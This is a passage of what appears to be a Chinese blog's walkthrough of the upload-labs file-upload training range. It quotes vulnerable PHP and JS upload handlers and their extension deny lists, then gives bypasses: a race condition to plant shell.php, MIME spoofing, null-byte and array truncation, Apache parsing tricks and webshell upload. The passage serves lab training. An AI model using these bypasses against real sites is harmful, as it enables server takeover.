class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答:"></a>解答:</h3><p>审计代码发现：rename修改名称，unlink删除文件，我们在他删除之前再次上传，使用条件竞争</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531501842-3c5c9dc6-00f1-4f53-83d6-30f9ebe01a0a.png" alt="image-20210426201242962"></p>
<p>发送到爆破，修改一下参数：</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531517933-3b4396fc-4b56-4236-9c3f-afb604fb46e8.png" alt="image-20210426210246728"></p>
<p>no payload 无限次循环</p>
<p>开始攻击。然后以同样的方法访问<code>write_shell.php</code>。当访问到相应为200后，会自动生成<code>shell.php</code>。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531509655-1e63d813-3616-4fa2-a64d-a0bd6875ffb3.png" alt="image-20210426210652361"></p>
<p>访问即可。</p>
<h2 id="level-19"><a href="#level-19" class="headerlink" title="level-19"></a>level-19</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>图片二次渲染，或者利用Apache解析漏洞条件竞争都可。</p>
<p>Apache解析漏洞参考链接：</p>
<p><a href="https://blog.csdn.net/qq_36374896/article/details/84189393">Apache HTTPD 未知后缀解析漏洞</a></p>
<h2 id="level-20"><a href="#level-20" class="headerlink" title="level-20"></a>level-20</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答:"></a>解答:</h3><p>%00截断或者继续解析漏洞。</p>
<p>可控post上去的文件名</p>
<p>直接文件包含也行。</p>
<h2 id="level-21"><a href="#level-21" class="headerlink" title="level-21"></a>level-21</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>数组加截断绕过，不详细复现了，给出参考链接和答案。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h3><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件解析漏洞总结</a></p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/104936689">upload-labs—wp（21关）</a></p>
<p><a href="https://blog.csdn.net/wo41ge/article/details/107313203">upload-labs 21关大合集</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109537262?spm=1001.2014.3001.5501">CTFSHOW文件上传篇</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs学习</title>
    <url>/2021/04/22/upload-labs%E5%AD%A6%E4%B9%A0%E4%B8%8A%E7%AF%87/</url>
    <content><![CDATA[<h1 id="upload-labs靶场训练篇（windows版21题）1-13题"><a href="#upload-labs靶场训练篇（windows版21题）1-13题" class="headerlink" title="upload-labs靶场训练篇（windows版21题）1-13题"></a>upload-labs靶场训练篇（windows版21题）1-13题</h1><p>upload-labs为文件上传的训练靶场，目前一共有21关，基本涵盖了目前全部的文件上传漏洞。此篇为上篇。</p>
<span id="more"></span>
<h2 id="level-1-前端JS验证"><a href="#level-1-前端JS验证" class="headerlink" title="level-1(前端JS验证)"></a>level-1(前端JS验证)</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>在浏览器中直接执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checkfile&#x3D;[]</span><br></pre></td></tr></table></figure>
<p>使得前端返回array为空，即可上传一句话木马，拿到shell。</p>
<h2 id="level-2-后端PHP验证"><a href="#level-2-后端PHP验证" class="headerlink" title="level-2(后端PHP验证)"></a>level-2(后端PHP验证)</h2><h3 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>BP抓包，修改为：<code>image/png</code>即可绕过</p>
<h2 id="level-3-解析漏洞"><a href="#level-3-解析漏洞" class="headerlink" title="level-3(解析漏洞)"></a>level-3(解析漏洞)</h2><h3 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>本题环境出了一些问题，Apache无法正常解析phps/phtml这样的后缀，因此只贴出做法。</p>
<p>使用前提：Apache的httpd.conf中有以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>
<p>ban了几个关键字，绕就完事了。后缀改为上述内容。如果不开解析，将会变成注释或者直接输出在屏幕上。</p>
<h2 id="level-4-htaccess"><a href="#level-4-htaccess" class="headerlink" title="level-4(.htaccess)"></a>level-4(.htaccess)</h2><h3 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span 